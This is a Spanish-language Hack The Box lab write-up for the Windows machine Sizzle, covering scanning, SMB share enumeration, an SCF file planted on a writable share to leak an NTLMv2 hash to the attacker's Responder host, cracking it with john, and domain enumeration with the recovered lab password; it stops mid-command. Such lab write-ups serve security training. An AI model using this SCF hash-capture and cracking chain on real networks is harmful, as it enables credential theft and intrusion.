---
title: Hack The Box Sizzle
author: k4miyo
date: 2021-11-14
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Insane, Windows]
tags: [Windows, Active Directory, Kerberoasting, Powershell, AppLocker Bypass]
ping: true
---

## Sizzle
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.103.

```bash
❯ ping -c 1 10.10.10.103
PING 10.10.10.103 (10.10.10.103) 56(84) bytes of data.
64 bytes from 10.10.10.103: icmp_seq=1 ttl=127 time=136 ms

--- 10.10.10.103 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 135.507/135.507/135.507/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.103 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-02 15:48 CST
Initiating SYN Stealth Scan at 15:48         
Scanning 10.10.10.103 [65535 ports]           
Discovered open port 445/tcp on 10.10.10.103
Discovered open port 21/tcp on 10.10.10.103   
Discovered open port 80/tcp on 10.10.10.103                                                                                      
Discovered open port 53/tcp on 10.10.10.103
Discovered open port 135/tcp on 10.10.10.103  
Discovered open port 443/tcp on 10.10.10.103
Discovered open port 139/tcp on 10.10.10.103     
Discovered open port 3268/tcp on 10.10.10.103                                                                                    
Discovered open port 49677/tcp on 10.10.10.103
Discovered open port 3269/tcp on 10.10.10.103   
Discovered open port 47001/tcp on 10.10.10.103  
Discovered open port 49668/tcp on 10.10.10.103  
Discovered open port 464/tcp on 10.10.10.103    
Discovered open port 49719/tcp on 10.10.10.103  
Discovered open port 49665/tcp on 10.10.10.103  
Discovered open port 5986/tcp on 10.10.10.103   
Discovered open port 49666/tcp on 10.10.10.103  
Discovered open port 49693/tcp on 10.10.10.103  
Discovered open port 389/tcp on 10.10.10.103    
Discovered open port 49664/tcp on 10.10.10.103  
Discovered open port 49690/tcp on 10.10.10.103  
Discovered open port 49688/tcp on 10.10.10.103  
Discovered open port 5985/tcp on 10.10.10.103   
Discovered open port 49689/tcp on 10.10.10.103  
Discovered open port 636/tcp on 10.10.10.103    
Discovered open port 9389/tcp on 10.10.10.103   
Discovered open port 49712/tcp on 10.10.10.103  
Discovered open port 593/tcp on 10.10.10.103    
Discovered open port 49706/tcp on 10.10.10.103  
Completed SYN Stealth Scan at 15:49, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.103               
Host is up, received user-set (0.14s latency).  
Scanned at 2021-11-02 15:48:42 CST for 26s      
Not shown: 65506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
5986/tcp  open  wsmans           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49693/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49712/tcp open  unknown          syn-ack ttl 127
49719/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
           Raw packets sent: 131050 (5.766MB) | Rcvd: 38 (1.672KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.103
   5   │     [*] Open ports: 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49668,4967
       │ 7,49688,49689,49690,49693,49706,49712,49719
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49668,49677,496[49/51]
9,49690,49693,49706,49712,49719 10.10.10.103 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-02 15:50 CST
Nmap scan report for 10.10.10.103      
Host is up (0.14s latency).                                                                                                      
                                                                                                                                 
PORT      STATE SERVICE       VERSION      
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                           
| ftp-syst:                                                     
|_  SYST: Windows_NT                                                                                                             
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods:                                                 
|_  Potentially risky methods: TRACE                                                                                             
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2021-11-02T21:57:13+00:00; +4m50s from scanner time.     
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55    
|_Not valid after:  2020-07-02T17:58:55            
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=sizzle.htb.local   
| Not valid before: 2018-07-03T17:58:55            
|_Not valid after:  2020-07-02T17:58:55            
|_http-title: Site doesn't have a title (text/html).                                                                             
| tls-alpn:                                                     
|   h2                                                          
|_  http/1.1                                                    
|_http-server-header: Microsoft-IIS/10.0           
| http-methods:                                                 
|_  Potentially risky methods: TRACE               
|_ssl-date: 2021-11-02T21:57:13+00:00; +4m51s from scanner time.      
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2021-11-02T21:57:13+00:00; +4m50s from scanner time. 
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55   
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2021-11-02T21:57:14+00:00; +4m51s from scanner time. 
| ssl-cert: Subject: commonName=sizzle.htb.local                                                                                 
| Not valid before: 2018-07-03T17:58:55                      
|_Not valid after:  2020-07-02T17:58:55
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2021-11-02T21:57:13+00:00; +4m51s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2021-11-02T21:57:13+00:00; +4m51s from scanner time.
|_http-title: Not Found
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2018-07-02T20:26:23
|_Not valid after:  2019-07-02T20:26:23
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-11-02T21:56:40
|_  start_date: 2021-11-02T21:50:48
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 4m50s, deviation: 0s, median: 4m50s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.23 seconds
```

Tenemos el puerto 21 abierto, así que vamos a tratar de logearnos como el usuario `anonymous` y tratar de ver algo:

```bash
❯ ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:k4miyo): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp>
```

No vemos nada interesante. Ahora vamos a tratar de ver las tecnología que están por el puerto 80 con al herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.103/
http://10.10.10.103/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.103], Microsoft-IIS[10.0], X-Powered-By[ASP.NET]
```

Podemos ver que visualizamos vía web; sin embargo, no vemos nada interesante:

![""](/assets/images/htb-sizzle/sizzle-web.png)

Podríamos tratar de ver si existe algún código oculto dentro de la imagen *.git*, pero no vamos a encontrar nada. Vemos que también se tiene el servico SMB por el puerto 445, así que vamos a tratar de ver si podemos listar recursos del servicio compartido:

```bash
❯ smbclient -L 10.10.10.103 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Analizando un poco los recursos que se nos muestran, observamos que tenemos acceso al directorio `Department Shares` y podemos listar diversas carpetas; así que vamos a hacer una montura para tratar de ver mejor la información.

```bash
❯ apt-get install cifs-utils
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
Paquetes sugeridos:
  winbind
Se instalarán los siguientes paquetes NUEVOS:
  cifs-utils
0 actualizados, 1 nuevos se instalarán, 0 para eliminar y 39 no actualizados.
Se necesita descargar 90.5 kB de archivos.
Se utilizarán 314 kB de espacio de disco adicional después de esta operación.
Des:1 https://edge1.parrot.run/parrot rolling/main amd64 cifs-utils amd64 2:6.11-3.1 [90.5 kB]
Descargados 90.5 kB en 1s (77.7 kB/s) 
Seleccionando el paquete cifs-utils previamente no seleccionado.
(Leyendo la base de datos ... 494440 ficheros o directorios instalados actualmente.)
Preparando para desempaquetar .../cifs-utils_2%3a6.11-3.1_amd64.deb ...
Desempaquetando cifs-utils (2:6.11-3.1) ...
Configurando cifs-utils (2:6.11-3.1) ...
update-alternatives: utilizando /usr/lib/x86_64-linux-gnu/cifs-utils/idmapwb.so para proveer /etc/cifs-utils/idmap-plugin (idmap-plugin) en modo automático
Procesando disparadores para man-db (2.9.4-2) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
❯ mkdir /mnt/smbmnt
❯ mount -t cifs "//10.10.10.103/Department Shares" /mnt/smbmnt/
Password for root@//10.10.10.103/Department Shares:
❯ tree /mnt/smbmnt/      
/mnt/smbmnt/             
├── Accounting          
├── Audit               
├── Banking               
│   └── Offshore      
│       ├── Clients   
│       ├── Data      
│       ├── Dev        
│       ├── Plans    
│       └── Sites     
├── CEO_protected      
├── Devops          
├── Finance          
├── HR                  
│   ├── Benefits      
│   ├── Corporate Events
│   ├── New Hire Documents
│   ├── Payroll       
│   └── Policies        
├── Infosec               
├── Infrastructure       
├── IT                  
├── Legal          
├── M&A                    
├── Marketing            
├── R&D                   
├── Sales                
├── Security           
├── Tax                 
│   ├── 2010               
│   ├── 2011             
│   ├── 2012         
│   ├── 2013            
│   ├── 2014                 
│   ├── 2015       
│   ├── 2016               
│   ├── 2017              
│   └── 2018               
├── Users              
│   ├── amanda          
│   ├── amanda_adm        
│   ├── bill                
│   ├── bob                  
│   ├── chris           
│   ├── henry                                                   
│   ├── joe
│   ├── jose
│   ├── lkys37en
│   ├── morgan
│   ├── mrb3n
│   └── Public
└── ZZ_ARCHIVE
    ├── AddComplete.pptx
    ├── AddMerge.ram
    ├── ConfirmUnprotect.doc
    ├── ConvertFromInvoke.mov
    ├── ConvertJoin.docx
    ├── CopyPublish.ogg
    ├── DebugMove.mpg
    ├── DebugSelect.mpg
    ├── DebugUse.pptx
    ├── DisconnectApprove.ogg
    ├── DisconnectDebug.mpeg2
    ├── EditCompress.xls
    ├── EditMount.doc
    ├── EditSuspend.mp3
    ├── EnableAdd.pptx
    ├── EnablePing.mov
    ├── EnableSend.ppt
    ├── EnterMerge.mpeg
    ├── ExitEnter.mpg
    ├── ExportEdit.ogg
    ├── GetOptimize.pdf
    ├── GroupSend.rm
    ├── HideExpand.rm
    ├── InstallWait.pptx
    ├── JoinEnable.ram
    ├── LimitInstall.doc
    ├── LimitStep.ppt
    ├── MergeBlock.mp3
    ├── MountClear.mpeg2
    ├── MoveUninstall.docx
    ├── NewInitialize.doc
    ├── OutConnect.mpeg2
    ├── PingGet.dot
    ├── ReceiveInvoke.mpeg2
    ├── RemoveEnter.mpeg3
    ├── RemoveRestart.mpeg
    ├── RequestJoin.mpeg2
    ├── RequestOpen.ogg
    ├── ResetCompare.avi
    ├── ResetUninstall.mpeg
    ├── ResumeCompare.doc
    ├── SelectPop.ogg
    ├── SuspendWatch.mp4
    ├── SwitchConvertFrom.mpg
    ├── UndoPing.rm
    ├── UninstallExpand.mp3
    ├── UnpublishSplit.ppt
    ├── UnregisterPing.pptx
    ├── UpdateRead.mpeg
    ├── WaitRevoke.pptx
    └── WriteUninstall.mp3

51 directories, 51 files
```

Vemos mucha información pero ningun recurso que nos pueda llamar la atención, así que vamos a tratar de ver en que directorios tenemos permisos de crear un archivo y/o un directorio mediante un comando con bash (**Nota**: Es importante mencionar que la escritura y la visualización en lenta debido a que se trata de una montura).

```bash
❯ cd /mnt/smbmnt/
❯ find . -type d | while read directory; do
pipe while> touch ${directory}/k4miyo 2>/dev/null && echo "${directory} - Archivo creado" && rm ${directory}/k4miyo
pipe while> mkdir ${directory}/k4miyo 2>/dev/null && echo "${directory} - Directorio creado" && rmdir ${directory}/k4miyo
pipe while> done
./Users/Public - Archivo creado
./Users/Public - Directorio creado
./ZZ_ARCHIVE - Archivo creado
./ZZ_ARCHIVE - Directorio creado
```

Después de un rato, vemos que tenemos capacidad de crear archivos y directorios en las siguientes rutas:

 - /Users/Public/
 - /ZZ_Archive/
 
 Ahora vamos a tratar de obtener cuales son las extensiones válidas de los archivos que podemos crear en ambas rutas. Para este caso, como sabemos que nos encontramos en una máquina Windows, probaremos las extensiones `exe`, `dll` y `scf`:
 
 ```bash
❯ cd Users/Public                                                                                                                
❯ touch ${/mnt/smbmnt/ZZ_ARCHIVE/,./}k4miyo.{exe,dll,scf}                                                                         
❯ ll                                                                                                                             
.rwxr-xr-x root root 0 B Tue Nov  2 18:23:23 2021  k4miyo.dll                                                                   
.rwxr-xr-x root root 0 B Tue Nov  2 18:23:22 2021  k4miyo.exe                                                                   
.rwxr-xr-x root root 0 B Tue Nov  2 18:23:23 2021  k4miyo.scf 
❯ ll /mnt/smbmnt/ZZ_ARCHIVE/ | grep k4miyo
.rwxr-xr-x root root   0 B  Tue Nov  2 18:29:09 2021 k4miyo.dll
.rwxr-xr-x root root   0 B  Tue Nov  2 18:28:58 2021 k4miyo.exe
.rwxr-xr-x root root   0 B  Tue Nov  2 18:29:19 2021 k4miyo.scf
 ```
 
 Ahora vamos a monitorear nuestros archivos creado con la siguiente instrucción ya que posiblemente se esté llevando a acabo una tarea en intervalos regulares:
 
 ```bash
❯ watch -d "ls -l /mnt/smbmnt/Users/Public/*; ls -l /mnt/smbmnt/ZZ_ARCHIVE/k4miyo*"
 ```
 
 Después de como un minuto, vemos que los archivos en la ruta `/mnt/smbmnt/Users/Public` han sido eliminados; por lo que ya sabemos que se está ejecutando una tarea dentro del sistema. Con esto, ya debemos estar pensando en un [***SCF File Attacks***](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/); en que consiste, bueno, tenemos que subir un archivo de extensión SCF (*Shell Command Files*) el cual nos ayuda a ejecutar tareas cuando se abre un explorador; entonces vamos a tratar de que cuado se abra la ruta `/mnt/smbmnt/Users/Public`, la tarea a ejecutar trate de buscar un recurso en nuestra máquina y al momento de hacer, podemos pillar el hash NTLM de versión 2 (éste no nos sirve para hacer pass-the-hash pero podríamos tratar de crackearlo y obtener credenciales). Asi que con esto en mente, primero vamos a crear nuestro archivo en nuestro directorio de trabajo:
 
 ```bash
[Shell]
Command=2
IconFile=\\10.10.14.23\smbFolder\k4mi
 ```
 
 Y ahora vamos a usar la herramienta `Responder` y validando que en el archivo de configuración de tenga **ON** en el parámetro de SMB.
 
 ```bash
❯ cd /usr/share/responder/
❯ cat Responder.conf
───────┬───────────────────────────────────────
       │ File: Responder.conf
───────┼───────────────────────────────────────
   1   │ [Responder Core]
   2   │ 
   3   │ ; Servers to start
   4   │ SQL = On
   5   │ SMB = On
   6   │ RDP = On
   7   │ Kerberos = On
   8   │ FTP = On
   9   │ POP = On
  10   │ SMTP = On
  11   │ IMAP = On
  12   │ HTTP = On
  13   │ HTTPS = On
  14   │ DNS = On
  15   │ LDAP = On
  16   │ DCERPC = On
  17   │ WINRM = On
 ```
 
Ahora, ejecutamos el `Responder.py` y copiamos nuestro archivo a al ruta `/mnt/smbmnt/Users/Public` y esperar a que se ejecute la tarea y se abra el explorador de archivos para eliminar nuestro documento:

```bash
❯ python2 Responder.py -I tun0 -r -d -w
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
                                                                
           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
                                                                
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C   
                                                                
                                                                
[+] Poisoners:                                                  
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
                                                                
[+] Servers:                                                    
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON] 
    SQL server                 [ON] 
    FTP server                 [ON] 
    IMAP server                [ON] 
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON] 
    LDAP server                [ON] 
    RDP server                 [ON] 
    DCE-RPC server             [ON] 
    WinRM server               [ON] 

[+] HTTP Options:   
    Always serving EXE         [OFF] 
    Serving EXE                [OFF]        
    Serving HTML               [OFF]   
    Upstream Proxy             [OFF]     

[+] Poisoning Options:        
    Analyze Mode               [OFF]            
    Force WPAD auth            [OFF]       
    Force Basic Auth           [OFF]  
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.23]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-DGNB2Z2CQI6]
    Responder Domain Name      [7IKF.LOCAL]
    Responder DCE-RPC Port     [49713]

[+] Listening for events...
```

```bash
❯ pwd
/mnt/smbmnt/Users/Public
❯ cp /home/k4miyo/Documentos/HTB/Sizzle/content/k4miyo.scf .
❯ ll
.rwxr-xr-x root root 56 B Tue Nov  2 19:03:22 2021  k4miyo.scf
```

Después de un rato, vemos algo en el `Responder`, un hash NTMLv2 del usuario **amanda**:

```bash
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:03dbbfdf46c7b1ff:B014A69B664E0761BAC728987CDA1C15:010100000000000000947E4B1BD0D701AE00CFF1FA8E8A4F0000000002000800370049004B00460001001E00570049004E002D00440047004E00420032005A003200430051004900360004003400570049004E002D00440047004E00420032005A00320043005100490036002E00370049004B0046002E004C004F00430041004C0003001400370049004B0046002E004C004F00430041004C0005001400370049004B0046002E004C004F00430041004C000700080000947E4B1BD0D70106000400020000000800300030000000000000000100000000200000C9F3E79F873E13820A465E861B4745C2CA85B9EB4E8F8ADF6701C0283B51DCA30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003300000000000000000000000000
[*] Skipping previously captured hash for HTB\amanda
[*] Skipping previously captured hash for HTB\amanda
```

Ahora vamos a tratar de crackear el hash para ver si obtenemos credenciales del usuario **amanda**:

```bash
❯ catn hash
amanda::HTB:03dbbfdf46c7b1ff:B014A69B664E0761BAC728987CDA1C15:010100000000000000947E4B1BD0D701AE00CFF1FA8E8A4F0000000002000800370049004B00460001001E00570049004E002D00440047004E00420032005A003200430051004900360004003400570049004E002D00440047004E00420032005A00320043005100490036002E00370049004B0046002E004C004F00430041004C0003001400370049004B0046002E004C004F00430041004C0005001400370049004B0046002E004C004F00430041004C000700080000947E4B1BD0D70106000400020000000800300030000000000000000100000000200000C9F3E79F873E13820A465E861B4745C2CA85B9EB4E8F8ADF6701C0283B51DCA30A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003300000000000000000000000000
```

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:03 DONE (2021-11-02 19:02) 0.3300g/s 3768Kp/s 3768Kc/s 3768KC/s Ashiah08..AorAir2531
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Siempre debemos de guardar las credenciales que vamos  encontrando. Ahora, vamos a tratar de enumerar los recursos del dominio con `rpcclient`:

```bash
❯ rpcclient -U "amanda" -W "htb.local" 10.10.10.103
Enter HTB.LOCAL\amanda's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[amanda] rid:[0x450]
user:[mrlky] rid:[0x643]
user:[sizzler] rid:[0x644]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44f]

rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
        rid:[0x644] attr:[0x7]
		
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      mar, 02 nov 2021 18:14:56 CST
        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
        Password last set Time   :      jue, 12 jul 2018 12:32:41 CDT
        Password can change Time :      vie, 13 jul 2018 12:32:41 CDT
        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000075
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient $> queryuser 0x644
        User Name   :   sizzler
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      mié, 31 dic 1969 18:00:00 CST
        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
        Password last set Time   :      jue, 12 jul 2018 09:29:49 CDT
        Password can change Time :      vie, 13 jul 2018 09:29:49 CDT
        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
        unknown_2[0..31]...
        user_rid :      0x644
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $>
```

Vemos que los usuarios miembros del grupo **Admins** son **Administrator** y **sizzler**. Una forma más comoda para visualizar lo anterior y obtener información adicional, sería con la herramienta [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump).

```bash
❯ git clone https://github.com/dirkjanm/ldapdomaindump                                                                           
Clonando en 'ldapdomaindump'...                                                                                                  
remote: Enumerating objects: 255, done.                                                                                          
remote: Counting objects: 100% (65/65), done.                                                                                    
remote: Compressing objects: 100% (50/50), done.                
remote: Total 255 (delta 36), reused 37 (delta 15), pack-reused 190            
Recibiendo objetos: 100% (255/255), 118.95 KiB | 817.00 KiB/s, listo.                                                            
Resolviendo deltas: 100% (132/132), listo.                                                                                       
❯ cd ldapdomaindump/                                                                                                             
❯ ll                                                                                                                             
drwxr-xr-x root root  76 B  Tue Nov  2 19:25:13 2021  bin     
drwxr-xr-x root root 100 B  Tue Nov  2 19:25:13 2021  ldapdomaindump
.rw-r--r-- root root  66 B  Tue Nov  2 19:25:13 2021  ldapdomaindump.py                                                         
.rw-r--r-- root root 1.1 KB Tue Nov  2 19:25:13 2021  LICENSE                                                                   
.rw-r--r-- root root  59 B  Tue Nov  2 19:25:13 2021  MANIFEST.in                                          
.rw-r--r-- root root 7.1 KB Tue Nov  2 19:25:13 2021  Readme.md                                                                 
.rw-r--r-- root root 591 B  Tue Nov  2 19:25:13 2021  setup.py                                                                  
❯ python2 setup.py install                                                                                                       
running install                                                                                                                  
running bdist_egg                                                                                                                
running egg_info
...
```

Una vez descargada la herramienta e instalada, procedemos a ejecutarla vemos que nos pide algunos parámetros; se los ingresamos y exportamos la información a la ruta `/var/www/html` para poderla visualizar mejor con el servicio `apache`:

```bash
❯ python3 ldapdomaindump.py
usage: ldapdomaindump.py [-h] [-u USERNAME] [-p PASSWORD] [-at {NTLM,SIMPLE}] [-o DIRECTORY] [--no-html] [--no-json]
                         [--no-grep] [--grouped-json] [-d DELIMITER] [-r] [-n DNS_SERVER] [-m]
                         HOSTNAME
ldapdomaindump.py: error: the following arguments are required: HOSTNAME
❯ python3 ldapdomaindump.py -u "htb.local\amanda" -p "Ashare1972" 10.10.10.103 -o /var/www/html
manda" -p "Ashare1972" 10.10.10.103 -o /var/www/html - Parrot Terminal[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Corremos el servicio `apache` y tratamos de ver el contenido:

```bash
❯ service apache2 start
```

![""](/assets/images/htb-sizzle/sizzle-dominio.png)

Con esto, vemos de una forma gráfica toda la información referente al dominio.

![""](/assets/images/htb-sizzle/sizzle-domainusers.png)

![""](/assets/images/htb-sizzle/sizzle-domaingroupsmem.png)

Esta información debemos de tenerla presente para posterior. Ahora vamos a tratar de como el usuario **amanda** ver si tenemos nuevos privilegios sobre el servicio SMB.

```bash
❯ crackmapexec smb 10.10.10.103 -u 'amanda' -p 'Ashare1972' --shares
